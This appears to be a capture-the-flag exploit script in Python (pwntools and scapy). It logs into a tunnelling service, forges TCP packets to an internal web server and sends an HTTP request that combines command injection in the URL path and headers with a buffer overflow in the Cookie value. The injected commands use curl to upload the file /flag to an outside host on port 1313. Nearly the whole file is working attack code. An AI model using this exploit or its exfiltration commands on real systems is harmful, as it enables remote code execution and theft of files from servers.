from pwn import *
from scapy.all import *
debug = 0

context.log_level = 'debug'
def login() -> remote:
    if debug:
        p = remote('127.0.0.1', 443, ssl=True)
    else:
#        p = remote('111.186.58.249', 38806, ssl=True)
         p = remote('fuzz.exp.sh', 443, ssl=True)
    content = b'name=rea1user&passwd=re4lp4ssw0rd'
    total = len(content)
    raw = b''
    raw += b'POST /login HTTP/1.1\r\n'
    raw += b'Content-Length: ' + str(total).encode('ascii') + b'\r\n'
    raw += b'\r\n'
    raw += content

    p.send(raw)
    p.recvuntil('success')
    return p
def wrap(data):
    return p32(0xdeadbeef) + p16(len(data) + 6, endian='big') + data
def check_vip(p, val, pack_only=False):
    packet = wrap(p16(3) + p32(val, endian='big'))
    if not pack_only:
        p.send(packet)
        buf = p.recvn(0xC)
        return u32(buf[-4:])
    else:
        return packet
def req_vip(p, val, pack_only=False):
    packet = wrap(p16(1) + p32(val, endian='big'))
    if not pack_only:
        p.send(packet)
        buf = p.recvn(4)
        buf = p.recvn(2)
        sz = u16(buf, endian='big')
        buf = p.recvn(sz - 6)
        return u32(buf[2:6])
    else:
        return packet
def ip2long(ip):
    """
    Convert an IP string to long
    """
    packedIP = socket.inet_aton(ip)
    return struct.unpack("!L", packedIP)[0]
def route(p, data):
    p.send(wrap(p16(2) + data))
def recv_packet(p):
    p.recvuntil(p32(0xdeadbeef), drop=1)
    sz = u16(p.recvn(2), endian='big') - 6
    data = p.recvn(sz)
    return data[2:]

# Cookie: sessionID=aaaabaaacaaadaaaea\x88\x13\x88\xbeaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoa\x18\xb1\x01

payload = '''POST /curl%20-F%20flag=@/flag%208.210.251.182:1313;.htm HTTP/1.0
Host: 10.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: ;curl -F flag=@/flag vps.exp.sh:1313;
Content-Length: 140
Connection: close
Authorization:Basic O3RvdWNoIC90bXAvaGFjaw==
Cookie: sessionID=curl${IFS}-d${IFS}@/flag${IFS}8.210.251.182:1313maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoa\x1c\xb1\x01


'''
payload.replace('\n','\r\n')

base = ip2long('172.31.0.0')
m = login()
req_vip(m, base + 2)
sport = randint(1024, 65535)
ip = IP(src='172.31.0.2', dst='10.1.1.1')
SYN = TCP(sport=sport, dport=80, flags='S', seq=1000)
s = raw(ip / SYN)
route(m, s)
data = recv_packet(m)
ack = IP(data)
a = TCP(sport=sport, dport=80, flags='A', seq=ack.ack + 1, ack=ack.seq + 1)
route(m, raw(ip / a))
d = TCP(sport=sport, dport=80, flags='PA', seq=1001, ack=ack.seq + 1) / payload.encode('latin1')
route(m, raw(ip / d))
# data = recv_packet(m)
# d=IP(data)
# print(d[TCP].payload)
m.interactive()
